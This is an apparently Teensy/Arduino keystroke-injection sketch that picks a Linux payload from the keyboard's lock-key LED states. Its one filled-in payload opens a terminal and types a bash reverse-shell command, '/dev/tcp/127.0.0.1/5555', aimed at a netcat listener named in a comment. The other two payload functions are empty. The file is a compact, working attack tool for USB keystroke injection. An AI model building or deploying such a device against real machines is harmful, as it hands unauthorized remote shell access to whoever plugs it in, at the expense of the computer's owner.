/*
 * Run different Linux payloads based on LOCK key states
 */

extern volatile uint8_t keyboard_leds;

#define NUM_LOCK_BIT 0x01
#define CAPS_LOCK_BIT 0x02
#define SCROLL_LOCK_BIT 0x04

uint8_t old_state;

void toggle_lock_keys(uint8_t state) { 
  if (state & NUM_LOCK_BIT) {
    Keyboard.set_key1((uint8_t)KEY_NUM_LOCK);
  }

  if (state & CAPS_LOCK_BIT) {
    Keyboard.set_key2((uint8_t)KEY_CAPS_LOCK);
  }

  if (state & SCROLL_LOCK_BIT) {
    Keyboard.set_key3((uint8_t)KEY_SCROLL_LOCK);
  }

  Keyboard.send_now();
  Keyboard.releaseAll();
}

void send_payload_1() {
}

void send_payload_2() {  
  Keyboard.set_modifier(MODIFIERKEY_ALT | MODIFIERKEY_CTRL);
  Keyboard.set_key1((uint8_t)KEY_T);
  Keyboard.send_now();
  Keyboard.releaseAll();

  delay(1000);

  // other side needs to be listening: nc -lp 5555 
  Keyboard.println("exec >& /dev/tcp/127.0.0.1/5555 0>&1");
  Keyboard.send_now();
}

void send_payload_3() {
}

void setup() {
  delay(3000); 
}

void loop() {
  uint8_t current_state = keyboard_leds;

  if (current_state == old_state) {
    toggle_lock_keys(current_state);

    switch (current_state) {
      case 1:
        send_payload_1();
        break;

      case 2:
        send_payload_2();
        break;

      case 3:
        send_payload_3();
        break;
    }
  }

  old_state = current_state;
  
  delay(1000);
}
